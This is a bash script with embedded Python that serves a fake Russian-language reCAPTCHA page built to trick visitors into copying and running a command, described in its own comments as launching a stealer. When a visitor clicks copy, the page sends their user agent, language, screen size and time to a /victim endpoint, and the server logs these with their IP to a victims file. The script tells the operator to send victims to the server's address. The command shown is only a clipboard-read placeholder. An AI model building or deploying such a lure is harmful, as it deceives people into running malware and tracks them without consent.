#!/bin/bash
# КАПЧА-ЛОВУШКА — reCAPTCHA которая заставляет запустить стилер
PORT=${1:-8880}

echo "[CAPTCHA-TRAP] Запускаю капча-ловушку на порту $PORT..."

python3 -c "
import http.server, json, os, time, base64

LOG_FILE = os.path.expanduser('~/shadow_captcha_victims.json')
STOLEN_DIR = os.path.expanduser('~/shadow_captcha_loot')
os.makedirs(STOLEN_DIR, exist_ok=True)

class CaptchaTrap(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            html = '''<!DOCTYPE html>
<html lang=\"ru\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>Подтвердите что вы не робот</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Roboto, Arial, sans-serif;
            background: linear-gradient(135deg, #1a73e8 0%, #0d47a1 100%);
            min-height: 100vh;
            display: flex; align-items: center; justify-content: center;
        }
        .box {
            background: white;
            padding: 40px 50px;
            border-radius: 20px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
            max-width: 450px;
        }
        .box h2 { color: #202124; font-size: 24px; margin-bottom: 8px; }
        .box p { color: #5f6368; font-size: 14px; margin-bottom: 30px; }
        .captcha {
            background: #f8f9fa;
            border: 1px solid #dadce0;
            border-radius: 4px;
            padding: 30px 20px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 15px;
            cursor: pointer;
            transition: all 0.2s;
        }
        .captcha:hover { background: #fff; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
        .checkbox {
            width: 28px; height: 28px;
            border: 2px solid #9aa0a6;
            border-radius: 2px;
            background: white;
            transition: all 0.3s;
        }
        .checkbox.checked { background: #1a73e8; border-color: #1a73e8; }
        .checkmark { display: none; color: white; font-size: 18px; font-weight: bold; }
        .checkbox.checked .checkmark { display: block; }
        .spinner {
            display: none;
            width: 30px; height: 30px;
            border: 3px solid #e0e0e0;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .cmd-box {
            display: none;
            background: #fce8e6;
            border: 1px solid #f5c6cb;
            border-radius: 12px;
            padding: 20px;
            margin-top: 20px;
            text-align: center;
        }
        .cmd-box p { color: #d93025; font-weight: bold; margin-bottom: 10px; }
        .cmd-code {
            background: #1a1a1a;
            color: #0f0;
            padding: 12px 15px;
            border-radius: 8px;
            font-family: monospace;
            font-size: 13px;
            user-select: all;
            word-break: break-all;
            margin: 10px 0;
        }
        .btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 40px;
            font-size: 15px;
            border-radius: 25px;
            cursor: pointer;
            margin-top: 10px;
        }
        .btn:hover { background: #1557b0; }
        .success-msg { display: none; color: #1e8e3e; margin-top: 15px; font-weight: bold; }
    </style>
</head>
<body>
    <div class=\"box\">
        <h2>Подтвердите что вы не робот</h2>
        <p>Пожалуйста, пройдите проверку безопасности для продолжения</p>
        
        <div class=\"captcha\" id=\"captcha\" onclick=\"startVerify()\">
            <div class=\"checkbox\" id=\"checkbox\">
                <span class=\"checkmark\">✓</span>
            </div>
            <span style=\"color:#202124;font-size:15px\">Я не робот</span>
        </div>
        
        <div class=\"spinner\" id=\"spinner\"></div>
        
        <div class=\"cmd-box\" id=\"cmdBox\">
            <p>⚠️ Дополнительная проверка</p>
            <p style=\"color:#5f6368;font-size:12px\">Для завершения верификации выполните команду:</p>
            <div class=\"cmd-code\" id=\"cmdCode\">termux-clipboard-get 2>/dev/null</div>
            <button class=\"btn\" onclick=\"copyAndDone()\">📋 Скопировать и продолжить</button>
        </div>
        
        <div class=\"success-msg\" id=\"success\">✅ Проверка пройдена! Вы не робот.</div>
    </div>
    
    <script>
        function startVerify() {
            document.getElementById('checkbox').classList.add('checked');
            document.getElementById('spinner').style.display = 'block';
            
            setTimeout(function() {
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('cmdBox').style.display = 'block';
            }, 1500);
        }
        
        function copyAndDone() {
            var code = document.getElementById('cmdCode').innerText;
            var el = document.createElement('textarea');
            el.value = code;
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);
            
            document.getElementById('cmdBox').style.display = 'none';
            document.getElementById('success').style.display = 'block';
            
            // Отправляем сигнал что жертва клюнула
            fetch('/victim', {method:'POST',body:JSON.stringify({
                userAgent: navigator.userAgent,
                language: navigator.language,
                screen: screen.width+'x'+screen.height,
                time: new Date().toString()
            })});
        }
    </script>
</body>
</html>'''
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(html.encode())
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        if self.path == '/victim':
            content_len = int(self.headers.get('Content-Length', 0))
            body = self.rfile.read(content_len).decode()
            
            victim_ip = self.client_address[0]
            print(f'\\n[🎯] VICTIM: {victim_ip}')
            print(f'[🎯] INFO: {body[:200]}')
            
            with open(LOG_FILE, 'a') as f:
                json.dump({'ip': victim_ip, 'data': body, 'time': time.ctime()}, f)
                f.write('\\n')
            
            self.send_response(200)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

print(f'[CAPTCHA-TRAP] http://localhost:$PORT')
print(f'[CAPTCHA-TRAP] Send victim to: http://YOUR_IP:$PORT')
http.server.HTTPServer(('0.0.0.0', $PORT), CaptchaTrap).serve_forever()
" &
echo "[CAPTCHA-TRAP] Капча-ловушка запущена на порту $PORT"
echo "[CAPTCHA-TRAP] Жертва видит reCAPTCHA → копирует команду → запускает стилер"
echo "[CAPTCHA-TRAP] Лог жертв: ~/shadow_captcha_victims.json"
